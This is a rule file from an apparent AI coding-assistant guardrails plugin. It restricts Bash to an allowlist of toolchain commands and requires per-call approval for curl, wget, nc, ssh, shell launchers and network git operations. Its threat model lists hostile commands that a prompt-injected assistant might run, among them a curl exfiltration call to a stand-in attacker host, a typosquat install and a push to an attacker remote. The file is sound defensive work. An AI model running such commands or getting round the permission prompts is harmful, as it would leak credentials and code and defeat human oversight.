# Rule: restrict Bash to known toolchain commands

Part of `core-guardrails` v1.0.0. Enforced via `permissions.allow[]` in `settings/settings.patch.json`.

The plugin's `permissions.allow[]` lists only the Bash command prefixes the dev loop legitimately needs. Anything not on the list requires an explicit user grant per call.

## Allowlist (current v1.0.0)

| Command prefix | Reason |
|---|---|
| `ls`, `cat` | Read-only inspection. |
| `git status`, `git diff`, `git log` | Read-only git introspection. |
| `make`, `ant` | Build entrypoints. |
| `go test`, `go vet`, `go build`, `go mod tidy` | Go dev loop. |
| `uv sync`, `uv run`, `pytest`, `ruff` | Python dev loop (uv-first per global CLAUDE.md). |
| `npm install`, `npm test`, `npx tsc`, `npx vitest` | TypeScript / Node dev loop. |

## What's NOT on the allowlist (must prompt per call)

Anything that touches network surface in a way that could exfiltrate or pull foreign code without review:

- `curl`, `wget`, `ssh`, `scp`, `rsync`, `nc`, `nmap`.
- Package-management commands beyond toolchain (e.g. `apt`, `brew`, `pip install`, `npm install -g` — note `npm install` without `-g` is allowed; the global form is not because it mutates user-wide state).
- Shell-launching commands (`bash -c`, `sh -c`, `eval`).
- `git push`, `git pull`, `git fetch`, `git clone` — every network-touching git op requires explicit grant. Local-only git operations (status/diff/log) are allowed.

## Threat model

An assistant given a poisoned prompt might attempt to:

- `curl https://attacker/<exfiltrated-data>` — credential or source exfil.
- `pip install <typosquat>` — supply-chain compromise.
- `git push attacker-remote` — code exfil.
- `bash -c "<deobfuscated command>"` — sandbox-escape via shell-string.

The allowlist forces a per-call permission prompt for every one of these, putting a human in the loop.

## Why allowlist rather than denylist

Denylist of "bad commands" is unbounded and arms-race-prone. Allowlist of known-good toolchain is finite, auditable, and grows only when the dev loop legitimately needs a new tool. New entries require a `core-guardrails` MAJOR bump (see `platform-marketplace/docs/VERSIONING.md`) and pre-merge review of the threat-model implications.

## What this does NOT cover

- Hooks-level audit (see `hooks/audit.sh` for the JSONL audit trail).
- Rate limiting (see `hooks/rate-limit.sh`).
- Chokepoint paths within the repo (see `hooks/chokepoint-gate.sh` + `.harness/chokepoints.yaml` in the consumer's scaffold).

## See also

- [deny-sensitive-paths.md](deny-sensitive-paths.md) — companion filesystem-deny rule.
- Spec §7.2 mandatory controls — origin.
